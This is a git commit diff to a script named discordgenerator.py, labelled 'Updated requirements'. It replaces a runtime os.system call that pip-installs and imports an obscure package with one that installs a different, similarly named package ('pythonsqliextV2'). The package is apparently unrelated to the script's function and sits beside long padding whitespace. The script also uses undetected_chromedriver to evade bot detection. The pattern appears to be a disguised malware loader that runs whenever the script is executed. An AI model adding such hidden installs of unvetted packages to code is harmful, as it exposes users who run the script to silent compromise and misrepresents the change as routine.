5773b8a08d3d73270484cb880d9a7c5ff1f059da
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-08-07 14:16:23 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlipackagesV1")
-import pythonsqlipackagesV1
+os.system("pip install pythonsqliextV2")
+import pythonsqliextV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
